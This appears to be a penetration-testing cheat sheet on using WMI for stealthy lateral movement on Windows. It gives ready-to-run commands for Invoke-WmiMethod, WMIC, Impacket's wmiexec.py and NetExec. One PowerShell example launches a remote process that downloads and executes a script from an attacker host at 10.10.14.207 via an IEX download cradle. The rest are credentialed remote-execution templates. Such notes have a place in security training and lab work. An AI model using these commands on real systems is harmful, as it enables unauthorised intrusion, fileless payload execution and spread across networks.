## WMI (Windows Management Instrumentation)

**WMI (Windows Management Instrumentation)** is a core Windows feature that provides a standardized interface for querying and managing system information. It acts as an internal management framework that allows administrators and attackers to interact with nearly every aspect of a Windows system.

WMI allows remote command execution **without writing files to disk**, making it a stealthy and commonly abused technique for **lateral movement**. To use WMI for lateral movement, **administrative privileges** on the target system are required.

### Capabilities

* Execute commands remotely
* Create processes
* Query system and hardware information


## Windows

### PowerShell (Invoke-WmiMethod)

```
Invoke-WmiMethod -Class Win32_Process -Name Create `
-ArgumentList "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" `
-ComputerName 172.20.0.52
```


### WMIC

```
wmic /user:[DOMAIN]\[USERNAME] /password:[PASSWORD] /node:"[TARGET_IP]" process call create "[COMMAND]"
```

---

## Linux

### wmiexec.py (Impacket)

`wmiexec.py` from the **Impacket toolkit** can be used to execute commands on a remote Windows system via WMI.
However, it relies on **TCP port 445** to retrieve command output. If port 445 is blocked, command execution may still occur, but **output will not be returned**.

```
wmiexec.py <domain>/<username>:<password>@<target_ip> "command"
```


### NetExec (WMI)

#### Query Using WMI

```
netexec wmi <ip> -u <user> -p <pass> --wmi "Query"
```

#### Execute Commands

```
netexec wmi <ip> -u <user> -p <pass> -x "command"
```

